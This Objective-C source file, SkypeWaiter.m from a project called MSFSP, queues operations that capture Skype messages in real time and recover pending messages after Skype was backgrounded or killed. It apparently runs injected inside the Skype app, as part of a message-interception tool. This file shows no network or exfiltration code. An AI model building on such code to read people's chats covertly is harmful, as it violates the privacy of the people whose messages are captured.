//
//  SkypeWaiter.m
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 6/16/2557 BE.
//
//

#import "SkypeWaiter.h"
#import "SkypeOperation.h"
#import "SKPConversation.h"
#import "SkypePendingMessageStore.h"
#import "SkypeAccountUtils.h"
#import "SKPConversationLists.h"


static SkypeWaiter *_SkypeWaiter = nil;


@implementation SkypeWaiter


#pragma mark - Initializer


+ (id) sharedSkypeWaiter {
    if (_SkypeWaiter == nil) {
        _SkypeWaiter = [[SkypeWaiter alloc] initPrivate];
    }
    return (_SkypeWaiter);
}

// Designated Initializer
- (id)initPrivate {
    self = [super init];
    if (self) {
        mQueue = [[NSOperationQueue alloc] init];
        [mQueue setMaxConcurrentOperationCount:1];
        
        mQueueList = [[NSMutableDictionary alloc] init];
    }
    return self;
}

// We don't intend to use this initialization
- (id) init {
    [NSException raise:@"Use share instance only" format:@"+[SkypeWaiter sharedSkypeWaiter]"];
    return nil;
}


#pragma mark - Capturing (obsolete)

 
// obsoleted; use v2 instead
// Capture while Chat View is being presented
- (void) captureRealTimeMessageID: (unsigned) aMessageID conversation: (SKPConversation *) aConversation {
    DLog(@"Capture Realtime %lu message in queue",(unsigned long)[mQueue operationCount])
    SkypeOperation *skpOperation                = [[SkypeOperation alloc] initWithMessageID: aMessageID
                                                                               conversation: aConversation
                                                                              operationType: kSkypeOperationTypeRealTimeMessage];
    [mQueue addOperation:skpOperation];
    
    [skpOperation autorelease];
}


// obsolete;
/*
 Capture while Chat View is not being presented; in other words, the case below is in action
 - Chat List View is being presented
 - Skype is running on background
 - Skype is killed by user
 */

- (void) capturePendingIncomingMessagesInConversation: (SKPConversation *) aConversation {
    DLog(@"Capture Pending")
    SkypeOperation *skpOperation                = [[SkypeOperation alloc] initWithMessageID: 0
                                                                               conversation: aConversation
                                                                              operationType: kSkypeOperationTypePendingMessage];
    [mQueue addOperation:skpOperation];
    [skpOperation autorelease];
}



#pragma mark - Capturing


- (void) captureRealTimeMessageIDV2: (unsigned) aMessageID conversation: (SKPConversation *) aConversation isPending: (BOOL) aIsPending {
    //DLog(@"Capture Realtime %lu message in queue",(unsigned long)[mQueue operationCount])
    // Get the queue for this conversation id
    DLog(@"all NSOperation queue %@", mQueueList)
    NSOperationQueue *myConversationQueue = [self getQueueForConversation:[aConversation conversationIdentity]];
    
    // -- Add operation and update store if neccessary
    if (myConversationQueue) {
        
        // -- Setup NSOperation
        SkypeOperation *skpOperation                = [[SkypeOperation alloc] initWithMessageID: aMessageID
                                                                                   conversation: aConversation
                                                                                  operationType: kSkypeOperationTypeRealTimeMessage];
        [skpOperation setCompletionBlock:^{
            /******************************************************************************************
             Remove message id and conversation id after done operation
             ******************************************************************************************/
            DLog(@"Done operation for message id %u in conver %@", (unsigned) aMessageID, [aConversation conversationIdentity])
            [[SkypePendingMessageStore sharedStore] removeMessageID:aMessageID
                                                       conversation:[aConversation conversationIdentity]];
        }];

        
        /******************************************************************************************
            Keep message id and conversation id to store
         ******************************************************************************************/
        DLog(@"operation count in this queue %lu",(unsigned long)[myConversationQueue operationCount])
        
        // -- Save only the first time that this message id come
        if (!aIsPending) {
            SkypePendingMessageStore *store     = [SkypePendingMessageStore sharedStore];
            [store addMessageID:aMessageID forConversation:[aConversation conversationIdentity]];
        }
        
        [myConversationQueue addOperation:skpOperation];
        
        [skpOperation autorelease];
    }

}


#pragma mark - Pending Message Handling


/* 
 Once applicatin launch, we need to get the list from store to see the pending message.
 Thus, this method must be called once the application did launc to prevent the store to be updated
 from the new incoming message
 */

- (void) preparePendingIncomingMessages {
    NSDictionary *pendingMessageInfo    = [[SkypePendingMessageStore sharedStore] getAllPendingMessagesInfoCopy];
    self.mPendingMessage                = pendingMessageInfo;

    DLog(@"********** PENDING MESSAGES %@", self.mPendingMessage)
}

- (void) captureAllPendingIncomingMessages {
    
    // Need to wait in another thread so that the Skype UI will not be blocked
    [NSThread detachNewThreadSelector:@selector(waitForConversationList:)
                             toTarget:self
                           withObject:[NSDictionary dictionaryWithObjectsAndKeys:[NSThread currentThread], @"thread",nil]];
/*
    NSDictionary *pendingMessageInfo = self.mPendingMessage;
    DLog(@"********** Copied dict %@", pendingMessageInfo)
    DLog(@"********** Copied dict address @@@@@@@@ %p", self.mPendingMessage)
    for (id each in [pendingMessageInfo allKeys]) {
        DLog(@"--- copied %@ %@ %p", [pendingMessageInfo[each] class ], pendingMessageInfo[each] , pendingMessageInfo[each] );
    }
    DLog(@"===================  END ===========================")
    
    for (NSString *converID in [pendingMessageInfo allKeys]) {
        DLog(@"Pending for conver: %@", converID)
        
        SKPConversation *conversation = [[SkypeAccountUtils sharedSkypeAccountUtils] getSKPConversationWithID:converID];
        
        for (NSNumber * messageID in pendingMessageInfo[converID]) {
            DLog(@">> Pending message %@ in conver %@", messageID, converID)
            unsigned unsignMsgID = [messageID unsignedIntValue];
            [self captureRealTimeMessageIDV2:unsignMsgID conversation:conversation isPending:YES];
        }
    }
 */
}

/*
 This method must be called after sometimes, otherwise the 'inboxConversations' property of SKPConversationList we kept in SkypeAccountUtils is still empty.
 */
- (void) waitForConversationList: (NSDictionary *) info {
    
    BOOL hasConverList = [[[SkypeAccountUtils sharedSkypeAccountUtils] mConversationList] inboxConversations] ? YES : NO;
    
    while (!hasConverList) {
        DLog(@"wait conversation list %@", [NSThread currentThread])
        
        // !!! Wait Here
        [NSThread sleepForTimeInterval:1];
        
        DLog(@"count %lu", (unsigned long)[[[[SkypeAccountUtils sharedSkypeAccountUtils] mConversationList] inboxConversations] count])
        hasConverList  = [[[SkypeAccountUtils sharedSkypeAccountUtils] mConversationList] inboxConversations] ? YES : NO;
    }
    //DLog(@"Current Thread %@, caller thread %@", [NSThread currentThread], info[@"thread"])
    [self performSelector:@selector(startCapturePendingMessage)
                 onThread:info[@"thread"]
               withObject:nil
            waitUntilDone:NO];
}

- (void) startCapturePendingMessage {
    
    NSDictionary *pendingMessageInfo = self.mPendingMessage;
    
    // -- Traverse all conversation
    for (NSString *converID in [pendingMessageInfo allKeys]) {
        DLog(@"Pending for conver: %@", converID)
        
        SKPConversation *conversation = [[SkypeAccountUtils sharedSkypeAccountUtils] getSKPConversationWithID:converID];
        
        // -- Traverse all messages in this conversation
        for (NSNumber * messageID in pendingMessageInfo[converID]) {
            DLog(@">> Capture pending message %@ in conver %@", messageID, converID)
            unsigned unsignMsgID = [messageID unsignedIntValue];
            [self captureRealTimeMessageIDV2:unsignMsgID conversation:conversation isPending:YES];
        }
    }
}


#pragma mark - Utils


- (NSOperationQueue *) getQueueForConversation: (NSString *) aConversationID {
    NSOperationQueue *queue = nil;
    if (aConversationID) {
        queue = mQueueList[aConversationID];
        if (!queue) {
            // Create NSOperationQueue
            DLog(@"create new queue for conver %@", aConversationID)
            NSOperationQueue *newQueue = [[NSOperationQueue alloc] init];
            [newQueue setMaxConcurrentOperationCount:1];
            [newQueue setName:aConversationID];
            
            queue = newQueue;
            [mQueueList setObject:queue forKey:aConversationID];
            [newQueue autorelease];
        }
    }
    return queue;
}

- (void) dealloc {
    [mQueue release];
    [mQueueList release];
    self.mPendingMessage = nil;
    
    [super dealloc];
}
@end
